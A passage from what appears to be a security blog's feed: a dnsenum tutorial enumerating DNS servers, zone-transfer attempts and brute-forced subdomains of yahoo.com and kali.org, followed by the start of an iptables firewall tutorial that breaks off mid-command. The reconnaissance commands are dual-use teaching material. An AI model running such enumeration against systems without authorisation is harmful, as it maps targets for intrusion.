</span><span class='line'>GENERAL OPTIONS:
</span><span class='line'>  --dnsserver     &lt;server&gt;
</span><span class='line'>          Use this DNS server for A, NS and MX queries.
</span><span class='line'>  --enum      Shortcut option equivalent to --threads 5 -s 15 -w.
</span><span class='line'>  -h, --help      Print this help message.
</span><span class='line'>  --noreverse     Skip the reverse lookup operations.
</span><span class='line'>  --nocolor       Disable ANSIColor output.
</span><span class='line'>  --private       Show and save private ips at the end of the file domain_ips.txt.
</span><span class='line'>  --subfile &lt;file&gt;  Write all valid subdomains to this file.
</span><span class='line'>  -t, --timeout &lt;value&gt; The tcp and udp timeout values in seconds (default: 10s).
</span><span class='line'>  --threads &lt;value&gt; The number of threads that will perform different queries.
</span><span class='line'>  -v, --verbose       Be verbose: show all the progress and all the error messages.
</span><span class='line'>GOOGLE SCRAPING OPTIONS:
</span><span class='line'>  -p, --pages &lt;value&gt;   The number of google search pages to process when scraping names,
</span><span class='line'>          the default is 5 pages, the -s switch must be specified.
</span><span class='line'>  -s, --scrap &lt;value&gt;   The maximum number of subdomains that will be scraped from Google (default 15).
</span><span class='line'>BRUTE FORCE OPTIONS:
</span><span class='line'>  -f, --file &lt;file&gt; Read subdomains from this file to perform brute force.
</span><span class='line'>  -u, --update    &lt;a|g|r|z&gt;
</span><span class='line'>          Update the file specified with the -f switch with valid subdomains.
</span><span class='line'>  a (all)     Update using all results.
</span><span class='line'>  g       Update using only google scraping results.
</span><span class='line'>  r       Update using only reverse lookup results.
</span><span class='line'>  z       Update using only zonetransfer results.
</span><span class='line'>  -r, --recursion Recursion on subdomains, brute force all discovred subdomains that have an NS record.
</span><span class='line'>WHOIS NETRANGE OPTIONS:
</span><span class='line'>  -d, --delay &lt;value&gt;   The maximum value of seconds to wait between whois queries, the value is defined randomly, default: 3s.
</span><span class='line'>  -w, --whois     Perform the whois queries on c class network ranges.
</span><span class='line'>           **Warning**: this can generate very large netranges and it will take lot of time to performe reverse lookups.
</span><span class='line'>REVERSE LOOKUP OPTIONS:
</span><span class='line'>  -e, --exclude   &lt;regexp&gt;
</span><span class='line'>          Exclude PTR records that match the regexp expression from reverse lookup results, useful on invalid hostnames.
</span><span class='line'>OUTPUT OPTIONS:
</span><span class='line'>  -o --output &lt;file&gt;    Output in XML format. Can be imported in MagicTree (www.gremwell.com)</span></code></pre></td></tr></table></div></figure>


<h3>Fix dnsenum whois and autoloader errors</h3>

<p>First, some preliminary troubleshooting information: dnsenum relies on some Perl modules that may not be already on your system. When running it with certain flags, you might see some warnings like this one: Warning: can&rsquo;t load Net::Whois::IP module, whois queries disabled. To fix it, install the module by running <code>perl -MCPAN -e shell</code> and then at the prompt: <code>install Net::Whois::IP</code>. If you try again, you might get a different error, however: Can&rsquo;t locate package AutoLoader for @net::Whois::IP::ISA at /usr/bin/dnsenum line 536. I scoured the Internet for a bit before finding a workaround: you can make it go away by adding <code>require AutoLoader;</code> to the module source code, or by removing the Autuloader reference: changing <code>@ISA = qw(Exporter AutoLoader);</code> to <code>@ISA = qw(Exporter);</code>. To find out where the module is located, use the CPAN tool:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cpan -D Net::Whois::IP
</span><span class='line'>Loading internal null logger. Install Log::Log4perl for logging messages
</span><span class='line'>Reading '/root/.cpan/Metadata'
</span><span class='line'>  Database was generated on Wed, 17 May 2017 06:54:04 GMT
</span><span class='line'>Net::Whois::IP
</span><span class='line'>-------------------------------------------------------------------------
</span><span class='line'>  (no description)
</span><span class='line'>  B/BS/BSCHMITZ/Net-Whois-IP-1.19.tar.gz
</span><span class='line'>  /usr/local/share/perl/5.24.1/Net/Whois/IP.pm
</span><span class='line'>  Installed: 1.19
</span><span class='line'>  CPAN:      1.19  up to date
</span><span class='line'>  Ben Schmitz (BSCHMITZ)
</span><span class='line'>  ben@foink.com</span></code></pre></td></tr></table></div></figure>


<p>You can see the path here, now go apply the fix in the IP.pm file and the error should go away.</p>

<h3>dnsenum usage</h3>

<ul>
<li>default</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsenum yahoo.com
</span><span class='line'>dnsenum.pl VERSION:1.2.3
</span><span class='line'>
</span><span class='line'>-----   yahoo.com   -----
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Host's addresses:
</span><span class='line'>__________________
</span><span class='line'>
</span><span class='line'>yahoo.com.                               5        IN    A        206.190.36.45
</span><span class='line'>yahoo.com.                               5        IN    A        98.139.183.24
</span><span class='line'>yahoo.com.                               5        IN    A        98.138.253.109
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Name Servers:
</span><span class='line'>______________
</span><span class='line'>
</span><span class='line'>ns1.yahoo.com.                           5        IN    A        68.180.131.16
</span><span class='line'>ns3.yahoo.com.                           5        IN    A        203.84.221.53
</span><span class='line'>ns4.yahoo.com.                           5        IN    A        98.138.11.157
</span><span class='line'>ns2.yahoo.com.                           5        IN    A        68.142.255.16
</span><span class='line'>ns5.yahoo.com.                           5        IN    A        119.160.247.124
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Mail (MX) Servers:
</span><span class='line'>___________________
</span><span class='line'>
</span><span class='line'>mta7.am0.yahoodns.net.                   5        IN    A        98.138.112.32
</span><span class='line'>mta7.am0.yahoodns.net.                   5        IN    A        98.138.112.37
</span><span class='line'>mta7.am0.yahoodns.net.                   5        IN    A        63.250.192.45
</span><span class='line'>mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.34
</span><span class='line'>mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.37
</span><span class='line'>mta7.am0.yahoodns.net.                   5        IN    A        66.196.118.240
</span><span class='line'>mta7.am0.yahoodns.net.                   5        IN    A        98.136.216.26
</span><span class='line'>mta7.am0.yahoodns.net.                   5        IN    A        98.136.217.202
</span><span class='line'>mta5.am0.yahoodns.net.                   5        IN    A        98.138.112.33
</span><span class='line'>mta5.am0.yahoodns.net.                   5        IN    A        98.138.112.34
</span><span class='line'>mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.33
</span><span class='line'>mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.34
</span><span class='line'>mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.35
</span><span class='line'>mta5.am0.yahoodns.net.                   5        IN    A        66.196.118.36
</span><span class='line'>mta5.am0.yahoodns.net.                   5        IN    A        98.136.216.25
</span><span class='line'>mta5.am0.yahoodns.net.                   5        IN    A        98.136.217.202
</span><span class='line'>mta6.am0.yahoodns.net.                   5        IN    A        98.136.216.25
</span><span class='line'>mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.38
</span><span class='line'>mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.37
</span><span class='line'>mta6.am0.yahoodns.net.                   5        IN    A        98.136.217.203
</span><span class='line'>mta6.am0.yahoodns.net.                   5        IN    A        98.138.112.35
</span><span class='line'>mta6.am0.yahoodns.net.                   5        IN    A        66.196.118.36
</span><span class='line'>mta6.am0.yahoodns.net.                   5        IN    A        63.250.192.46
</span><span class='line'>mta6.am0.yahoodns.net.                   5        IN    A        66.196.118.37
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Trying Zone Transfers and getting Bind Versions:
</span><span class='line'>_________________________________________________
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Trying Zone Transfer for yahoo.com on ns4.yahoo.com ...
</span><span class='line'>AXFR record query failed: REFUSED
</span><span class='line'>
</span><span class='line'>Trying Zone Transfer for yahoo.com on ns5.yahoo.com ...
</span><span class='line'>AXFR record query failed: REFUSED
</span><span class='line'>
</span><span class='line'>Trying Zone Transfer for yahoo.com on ns2.yahoo.com ...
</span><span class='line'>AXFR record query failed: REFUSED
</span><span class='line'>
</span><span class='line'>Trying Zone Transfer for yahoo.com on ns3.yahoo.com ...
</span><span class='line'>AXFR record query failed: REFUSED
</span><span class='line'>
</span><span class='line'>Trying Zone Transfer for yahoo.com on ns1.yahoo.com ...
</span><span class='line'>AXFR record query failed: REFUSED
</span><span class='line'>
</span><span class='line'>brute force file not specified, bay.</span></code></pre></td></tr></table></div></figure>


<p>From this output, you can see that the script performed DNS queries of the yahoo.com domain, enumerated the DNS and mail servers, and attempted zone transfers through the AXFR record type. Successful zone transfers are a misconfiguration that can have serious security impacts, because the DNS server sends its zone records to whoever requested them, thus revealing potentially sensitive information about the internal network topology, etc.</p>

<ul>
<li>with the &mdash;enum shortcut, which includes the flags: &mdash;threads 5 (5 threads), -s 15 (15 maximum subdomains to be scraped from Google), and -w (perform whois queries on class C ranges)</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsenum --enum kali.org
</span><span class='line'>dnsenum.pl VERSION:1.2.3
</span><span class='line'>
</span><span class='line'>-----   kali.org   -----
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Host's addresses:
</span><span class='line'>__________________
</span><span class='line'>
</span><span class='line'>kali.org.                                5        IN    A        192.124.249.10
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Name Servers:
</span><span class='line'>______________
</span><span class='line'>
</span><span class='line'>ns5.no-ip.com.                           5        IN    A        204.16.255.155
</span><span class='line'>ns4.no-ip.com.                           5        IN    A        204.16.254.44
</span><span class='line'>ns1.no-ip.com.                           5        IN    A        204.16.255.55
</span><span class='line'>ns3.no-ip.com.                           5        IN    A        207.34.6.1
</span><span class='line'>ns2.no-ip.com.                           5        IN    A        204.16.254.6
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Mail (MX) Servers:
</span><span class='line'>___________________
</span><span class='line'>
</span><span class='line'>aspmx.l.google.com.                      5        IN    A        108.177.15.27
</span><span class='line'>alt3.aspmx.l.google.com.                 5        IN    A        74.125.23.26
</span><span class='line'>alt4.aspmx.l.google.com.                 5        IN    A        74.125.28.26
</span><span class='line'>alt1.aspmx.l.google.com.                 5        IN    A        108.177.14.27
</span><span class='line'>alt2.aspmx.l.google.com.                 5        IN    A        74.125.200.27
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Trying Zone Transfers and getting Bind Versions:
</span><span class='line'>_________________________________________________
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Trying Zone Transfer for kali.org on ns2.no-ip.com ... 
</span><span class='line'>AXFR record query failed: REFUSED
</span><span class='line'>
</span><span class='line'>Trying Zone Transfer for kali.org on ns4.no-ip.com ... 
</span><span class='line'>AXFR record query failed: REFUSED
</span><span class='line'>
</span><span class='line'>Trying Zone Transfer for kali.org on ns3.no-ip.com ... 
</span><span class='line'>AXFR record query failed: REFUSED
</span><span class='line'>
</span><span class='line'>Trying Zone Transfer for kali.org on ns1.no-ip.com ... 
</span><span class='line'>AXFR record query failed: NOTAUTH
</span><span class='line'>
</span><span class='line'>Trying Zone Transfer for kali.org on ns5.no-ip.com ... 
</span><span class='line'>AXFR record query failed: NOTAUTH
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Scraping kali.org subdomains from Google:
</span><span class='line'>__________________________________________
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ----   Google search page: 1   ---- 
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ----   Google search page: 2   ---- 
</span><span class='line'>
</span><span class='line'>  docs
</span><span class='line'>
</span><span class='line'> ----   Google search page: 3   ---- 
</span><span class='line'>
</span><span class='line'>  de.docs
</span><span class='line'>  archive
</span><span class='line'>
</span><span class='line'> ----   Google search page: 4   ---- 
</span><span class='line'>
</span><span class='line'>  archive-4
</span><span class='line'>  ja.docs
</span><span class='line'>
</span><span class='line'> ----   Google search page: 5   ---- 
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Google Results:
</span><span class='line'>________________
</span><span class='line'>
</span><span class='line'>de.docs.kali.org.                        5        IN    A        192.124.249.10
</span><span class='line'>ja.docs.kali.org.                        5        IN    A        192.124.249.10
</span><span class='line'>docs.kali.org.                           5        IN    A        192.124.249.10
</span><span class='line'>archive.kali.org.                        5        IN    CNAME    hera.kali.org.
</span><span class='line'>hera.kali.org.                           5        IN    A        192.99.45.140
</span><span class='line'>archive-4.kali.org.                      5        IN    CNAME    hecate.kali.org.
</span><span class='line'>hecate.kali.org.                         5        IN    A        149.202.201.51
</span><span class='line'>
</span><span class='line'>brute force file not specified, bay.</span></code></pre></td></tr></table></div></figure>


<p>One thing that you should keep in mind is that the Google scraping feature might not always work. In that case, you can check manually by using the same Google operator that dnsenum uses, with &ldquo;allinurl:-www site:target.com&rdquo;</p>

<ul>
<li>bruteforce subdomains and perform whois queries</li>
</ul>


<p>dnsenum has a domain bruteforce file located at <code>/usr/share/dnsenum/dns.txt</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l /usr/share/dnsenum/dns.txt 
</span><span class='line'>1480 /usr/share/dnsenum/dns.txt</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see some domain bruteforcing in action! Again, looking at kali.org:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsenum -f /usr/share/dnsenum/dns.txt -w --noreverse kali.org
</span><span class='line'>[...]
</span><span class='line'>Brute forcing with /usr/share/dnsenum/dns.txt:
</span><span class='line'>_______________________________________________
</span><span class='line'>
</span><span class='line'>archive.kali.org.                        5        IN    CNAME    hera.kali.org.
</span><span class='line'>hera.kali.org.                           5        IN    A        192.99.45.140
</span><span class='line'>bugs.kali.org.                           5        IN    A        198.50.203.236
</span><span class='line'>bugs.kali.org.                           5        IN    A        198.50.203.235
</span><span class='line'>forums.kali.org.                         5        IN    A        192.124.249.12
</span><span class='line'>hermes.kali.org.                         5        IN    A        198.27.70.128
</span><span class='line'>http.kali.org.                           5        IN    CNAME    hebe.kali.org.
</span><span class='line'>hebe.kali.org.                           5        IN    A        192.99.200.113
</span><span class='line'>mail.kali.org.                           5        IN    CNAME    apollo.kali.org.
</span><span class='line'>apollo.kali.org.                         5        IN    A        23.239.31.82
</span><span class='line'>old.kali.org.                            5        IN    CNAME    hermes.kali.org.
</span><span class='line'>hermes.kali.org.                         5        IN    A        198.27.70.128
</span><span class='line'>pan.kali.org.                            5        IN    A        167.114.101.148
</span><span class='line'>shop.kali.org.                           5        IN    A        45.79.147.167
</span><span class='line'>www.kali.org.                            5        IN    A        192.124.249.10
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Launching Whois Queries:
</span><span class='line'>_________________________
</span><span class='line'>
</span><span class='line'> whois ip result:   23.239.31.0        -&gt;      23.239.0.0/19
</span><span class='line'> whois ip result:   45.79.147.0        -&gt;      45.79.0.0/16
</span><span class='line'> whois ip result:   167.114.101.0      -&gt;      167.114.0.0/16
</span><span class='line'> whois ip result:   192.99.45.0        -&gt;      192.99.0.0/16
</span><span class='line'> whois ip result:   192.124.249.0      -&gt;      192.124.249.0/24
</span><span class='line'> whois ip result:   198.27.70.0        -&gt;      198.27.64.0/18
</span><span class='line'> whois ip result:   198.50.203.0       -&gt;      198.50.203.0/27
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>kali.org________
</span><span class='line'>
</span><span class='line'> 192.99.0.0/16
</span><span class='line'> 23.239.0.0/19
</span><span class='line'> 45.79.0.0/16
</span><span class='line'> 198.50.203.0/27
</span><span class='line'> 192.124.249.0/24
</span><span class='line'> 167.114.0.0/16
</span><span class='line'> 198.27.64.0/18
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>kali.org ip blocks:
</span><span class='line'>____________________
</span><span class='line'>
</span><span class='line'> 23.239.31.82/32
</span><span class='line'> 45.79.147.167/32
</span><span class='line'> 167.114.101.148/32
</span><span class='line'> 192.99.45.140/32
</span><span class='line'> 192.99.200.113/32
</span><span class='line'> 192.124.249.10/32
</span><span class='line'> 192.124.249.12/32
</span><span class='line'> 198.27.70.128/32
</span><span class='line'> 198.50.203.235/32
</span><span class='line'> 198.50.203.236/32
</span><span class='line'>
</span><span class='line'>done.</span></code></pre></td></tr></table></div></figure>


<p>And today&rsquo;s cow saying is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Tomorrow, this will be part of the    \
</span><span class='line'>| unchangeable past but fortunately, it |
</span><span class='line'>\ can still be changed today.           /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[iptables firewall]]></title>
    <link href="http://chousensha.github.io/blog/2017/05/23/iptables-firewall/"/>
    <updated>2017-05-23T12:27:45-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/05/23/iptables-firewall</id>
    <content type="html"><![CDATA[<p>iptables is a CLI tool for configuring firewall functionality in Linux. It operates on a series of tables, which on a CentOS 7 system are:</p>

<!-- more -->


<ul>
<li><p><strong>filter</strong> &ndash; the default table used for packet filtering</p></li>
<li><p><strong>nat</strong> &ndash; for nat</p></li>
<li><p><strong>mangle</strong> &ndash; specialized packet alteration</p></li>
<li><p><strong>raw</strong> &ndash; used mainly for configuring connection exemptions</p></li>
<li><p><strong>security</strong> &ndash; Mandatory Access Control networking rules</p></li>
</ul>


<p>For the purpose of this post, we will be focusing on the filter table, which uses sets of rules to send (or not) packets on their merry way. These rules are called chains and they are as follows:</p>

<ul>
<li><p>INPUT &ndash; incoming connections</p></li>
<li><p>OUTPUT &ndash; outbound connections</p></li>
<li><p>FORWARD &ndash; packets being forwarded through the system</p></li>
</ul>


<p>Let&rsquo;s see the currently configured rules:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iptables -t filter -L | grep policy
</span><span class='line'>Chain INPUT (policy ACCEPT)
</span><span class='line'>Chain FORWARD (policy ACCEPT)
</span><span class='line'>Chain OUTPUT (policy ACCEPT)</span></code></pre></td></tr></table></div></figure>


<p>Well, everything is set to ACCEPT. The opposite of accepting connections is DROP, where the packets are silently dropped. Let&rsquo;s see it in action. First, change the policy to drop the packets: <code>iptables -P INPUT DROP</code>. Then try to ping the machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ping 192.168.217.131
</span><span class='line'>
</span><span class='line'>Pinging 192.168.217.131 with 32 bytes of data:
</span><span class='line'>Request timed out.
</span><span class='line'>Request timed out.
</span><span class='line'>Request timed out.
</span><span class='line'>Request timed out.
</span><span class='line'>
</span><span class='line'>Ping statistics for 192.168.217.131:
</span><span class='line'>    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),</span></code></pre></td></tr></table></div></figure>


<p>It is possible to also use the REJECT extension,  where packets are being dropped but the source host receives an error, thereby being notified that there may be filtering in place: <code>iptables -I INPUT -j REJECT</code>. Here the REJECT was inserted at the beginning of the INPUT chain, to ensure that it will be matched before anything else:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ping 192.168.217.131
</span><span class='line'>
</span><span class='line'>Pinging 192.168.217.131 with 32 bytes of data:
</span><span class='line'>Reply from 192.168.217.131: Destination port unreachable.
</span><span class='line'>Reply from 192.168.217.131: Destination port unreachable.
</span><span class='line'>Reply from 192.168.217.131: Destination port unreachable.
</span><span class='line'>Reply from 192.168.217.131: Destination port unreachable.
</span><span class='line'>
</span><span class='line'>Ping statistics for 192.168.217.131:
</span><span class='line'>    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),</span></code></pre></td></tr></table></div></figure>


<p>Some example scenarios:</p>

<h3>only allow SSH connections from specific IP</h3>

<p>Let&rsquo;s assume that a computer has to be locked down, and only accept SSH connections from a certain IP:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iptables -I INPUT -p tcp --dport 22 -s 192.168.217.137 -j ACCEPT</span></code></pre></td></tr></table></div></figure>


<p>With a policy of dropping packets, running the above will allow TCP connections for port 22, from the 192.168.217.137 source address, while still denying everything else.</p>

<h3>traffic forwarding</h3>

<p>Next, we have a machine with the IP 192.168.217.131 that we want to use to forward traffic to 192.168.217.137. How would we accomplish that?</p>

<p>First, we enable forwarding in the forwarding machine&rsquo;s kernel by putting a 1 inside <code>/proc/sys/net/ipv4/ip_forward</code>. On the .137 machine, I have a netcat listener on port 8000. On the .131 box, I also have netcat listening on port 4444. All connections coming to port 4444 on this machine will be routed to port 8000 on .137. The iptables rules to make that happen are:</p>

<ul>
<li><p><code>iptables -t nat -A PREROUTING -p tcp &mdash;dport 4444 -j DNAT &mdash;to-destination 192.168.217.137:8000</code> &ndash; we operate on the nat table. PREROUTING is used for altering packets as soon as they  come  in. We append a rule to this chain, stating that for TCP packets coming to port 4444 on this host, the destination IP will be changed to 192.168.217.137, on port 8000</p></li>
<li><p><code>iptables -t nat -A POSTROUTING -j MASQUERADE</code> &ndash; next we append to the POSTROUTING chain, that alters packets as they are about to go out, telling iptables to masquerate packets: replacing the IP of the sender to the IP of the forwarding machine</p></li>
</ul>


<p>Now I connect to port 4444 on 192.168.217.131 and send some random text, and checking my 192.168.217.137 listener, I see the traffic:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>c -vnlp 8000
